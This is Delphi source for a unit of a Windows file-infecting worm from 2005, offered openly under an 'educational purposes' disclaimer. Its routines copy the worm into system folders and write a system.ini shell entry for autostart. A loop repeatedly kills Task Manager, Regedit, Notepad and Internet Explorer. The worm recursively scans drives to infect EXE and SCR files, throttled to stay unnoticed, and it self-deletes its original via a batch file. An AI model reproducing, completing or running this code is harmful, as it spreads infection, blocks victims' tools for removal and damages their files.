   {

     Requested sourcecode for p0ke.no-ip.com page.
     use this as you want, but remember its only
     open source code for educational purposes.

     If you do not agree to take responsibility
     for any actions/damage made by this sourcecode
     (after your own modifications/compile) then
     close this project at once.
     The only responsible for anything here is you.

     (c) p0ke.no-ip.com 2005

     This unit contains the most used functions
     for this worm. Changing/Modifying anything
     might result into errors, so unless you know
     what you are doing, leave it as it is.

     Note:
       This sourcecode is uncommented for more advanced coders.
       A sourcecode with comments will be release at p0ke.no-ip.com

   }

   unit flipfunc;

   interface

   uses
     windows, ShellAPI, TLHelp32, flipscan, flipinfect;

   type
     TFlipp = Class(TObject)
     private
       FileName            :String;
     public
       MeltOnInstall       :Bool;
       Procedure Install(Name: String; Dir: Integer; Autostart: Bool);
       Procedure MeltHost;
       Procedure StartPE;
       Procedure ScanDir(Dir: String);

       Function  IsRunning(Name:String): Bool;
       function  GetFileSize(FileName: String): Int64;
     End;

     TAuto = Record
       Path : String;
     End;
     PAuto = ^TAuto;

     function UpperCase(const S: string): string;
     function ExtractFileName(const Path: string): string;
     function KillTask(ExeFileName: string): integer;

   implementation

   Function IntAuto(P: Pointer): DWord; STDCALL;
   Var
     Path: String;
   Begin
     Path := PAuto(P)^.Path;

     While True Do
     Begin
       // Writing to system.ini at 9x      (me, 95. 98. 98se, 3.11(?))
       // Writing to registry at NT        (2k, xp, nt, 2k3)
       WritePrivateProfileString('boot', 'shell', pchar('explorer.exe "'+Path+'"'), 'system.ini');
       KillTask('taskmgr.exe');
       KillTask('regedit.exe');
       KillTask('notepad.exe');
       KillTask('iexplore.exe');
       Sleep(1000);
     End;
   End;

   function ExtractFileExt(const Filename: string): string;
   var
     i, L: integer;
     Ch: Char;
   begin
     If Pos('.', Filename) = 0 Then
     Begin
       Result := '';
       Exit;
     End;
     L := Length(Filename);
     for i := L downto 1 do
     begin
       Ch := Filename[i];
       if (Ch = '.') then
       begin
         Result := Copy(Filename, i + 1, Length(Filename));
         Break;
       end;
     end;
   end;

   function ExtractFileName(const Path: string): string;
   var
     i, L: integer;
     Ch: Char;
   begin
     L := Length(Path);
     for i := L downto 1 do
     begin
       Ch := Path[i];
       if (Ch = '\') or (Ch = '/') then
       begin
         Result := Copy(Path, i + 1, L - i);
         Break;
       end;
     end;
   end;

   function UpperCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'a') and (Ch <= 'z') then Dec(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   function TFlipp.GetFileSize(FileName: String): Int64;
   Var
     H: THandle;
     fData: tWin32FindData;
   Begin
     Result := -1;
     H := FindFirstFile(pChar(FileName), fData);
     If H <> INVALID_HANDLE_VALUE Then
     Begin
       Windows.FindClose(H);
       Result := Int64(fData.nFileSizeHigh) shl 32 + fData.nFileSizeLow;
     End;
   End;

   function KillTask(ExeFileName: string): integer;
   const
     PROCESS_TERMINATE=$0001;
   var
     ContinueLoop: BOOL;
     FSnapshotHandle: THandle;
     FProcessEntry32: TProcessEntry32;
   begin
     result := 0;

     FSnapshotHandle := CreateToolhelp32Snapshot
                        (TH32CS_SNAPPROCESS, 0);
     FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
     ContinueLoop := Process32First(FSnapshotHandle,
                                    FProcessEntry32);

     while integer(ContinueLoop) <> 0 do
     begin
       if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) =
            UpperCase(ExeFileName))
        or (UpperCase(FProcessEntry32.szExeFile) =
            UpperCase(ExeFileName))) then
         Result := Integer(TerminateProcess(OpenProcess(
                           PROCESS_TERMINATE, BOOL(0),
                           FProcessEntry32.th32ProcessID), 0));
       ContinueLoop := Process32Next(FSnapshotHandle,
                                     FProcessEntry32);
     end;

     CloseHandle(FSnapshotHandle);
   end;

   function TFlipp.IsRunning(Name: string): bool;
   const
     PROCESS_TERMINATE=$0001;
   var
     ContinueLoop: BOOL;
     FSnapshotHandle: THandle;
     FProcessEntry32: TProcessEntry32;
     Len: Integer;
     name1, name2, name3: string;
   begin
     result := False;

     FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
     ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);

     while integer(ContinueLoop) <> 0 do
     begin
       Len := Length(FProcessEntry32.szExeFile);

       Name1 := UpperCase(ExtractFileName(FProcessEntry32.szExeFile));
       Name2 := UpperCase(Copy(Name, 1, Len));
       Name3 := UpperCase(FProcessEntry32.szExeFile);

       If (Name1 = Name2) Or (Name3 = Name2) Then Result := True;
       ContinueLoop := Process32Next(FSnapshotHandle,FProcessEntry32);
     end;
     CloseHandle(FSnapshotHandle);
   end;

   Procedure TFlipp.ScanDir(Dir: String);
   Var
     SearchRec     :TSearchRec;
   Begin
     Try
       If Dir[Length(Dir)] <> '\' Then Dir := Dir + '\';
       If FindFirst(Dir + '*.*', faDirectory, SearchRec) = 0 Then
   //---------------------------------------------------
       Repeat
         If ((SearchRec.Attr and faDirectory) = faDirectory) And (SearchRec.Name[1] <> '.') Then
         Begin
           If (UpperCase(SearchRec.Name) <> 'WINDOWS') and (UpperCase(SearchRec.Name) <> 'WINNT') Then
             ScanDir(Dir + SearchRec.Name);
         End Else Begin
           If (SearchRec.Name[1] <> '.') Then
           Begin
             If GetFileSize(SearchRec.Name) < 500000 Then
             Begin
               If UpperCase(ExtractFileExt(SearchRec.Name)) = 'EXE' Then
                 If Not (IsRunning(Dir + SearchRec.Name)) Then InfectFile(Dir + SearchRec.Name);
               If UpperCase(ExtractFileExt(SearchRec.Name)) = 'SCR' Then
                 If Not (IsRunning(Dir + SearchRec.Name)) Then InfectFile(Dir + SearchRec.Name);
             End;
           End;
         End;

         // Using Sleep(512) makes the infection-routin go slower but more secret.
         // Not using sleep(512) makes the infection-routing go fast but take 99% CPU
         // You choose yourself how you want it.
         Sleep(512);

       Until FindNext(SearchRec) <> 0;
       FindClose(SearchRec);
   //---------------------------------------------------
     Except
       FindClose(SearchRec);
       Exit;
     End;
   End;

   Procedure TFlipp.StartPE;
   Var
     CurDir        :Array[0..255] Of Char;
   Begin
     GetCurrentDirectory(256, CurDir);
     ScanDir(String(CurDir));

     While True Do
       ScanDir('C:\');
   End;

   Procedure TFlipp.MeltHost;
   Var
     BatFile       :TextFile;
     Line          :String;
   Begin
     Line :=       '@ECHO OFF'#13#10+
                   'CLS'#13#10+
                   'DEL "'+ParamStr(0)+'"'#13#10+
                   'DEL "C:\MOI.BAT"';

     AssignFile(BatFile, 'C:\MOI.BAT');
     ReWrite(BatFile);
     Write(BatFile, Line);
     CloseFile(BatFile);

     ShellExecute(0, 'open', pChar(Filename), nil, nil, 0);
     ShellExecute(0, 'open', 'C:\MOI.BAT',    nil, nil, 0);
     ExitProcess(0);
   End;

   Procedure TFlipp.Install(Name: String; Dir: Integer; Autostart: Bool);
   Var
     copyDir:  Array[0..255] Of Char;
     threadID: DWord;
     threadP : TAuto;
   Begin

     If (Dir = 0) Then
       GetWindowsDirectory(copyDir, 256)
     Else
       GetSystemDirectory (copyDir, 256);

     filename := string(copyDir) + '\' + Name;

     If (ParamStr(0) <> filename) Then
     Begin

       If (CopyFile(pChar(ParamStr(0)), pChar(filename), False)) Then
       Begin
         If (Autostart) Then
         Begin
           // Successfull copy of file ..
           ThreadP.Path := filename;
           CreateThread(nil, 0, @IntAuto, @ThreadP, 0, ThreadID);
         End;

         If (MeltOnInstall) Then
           MeltHost;
       End;

     End;

   End;

   end.
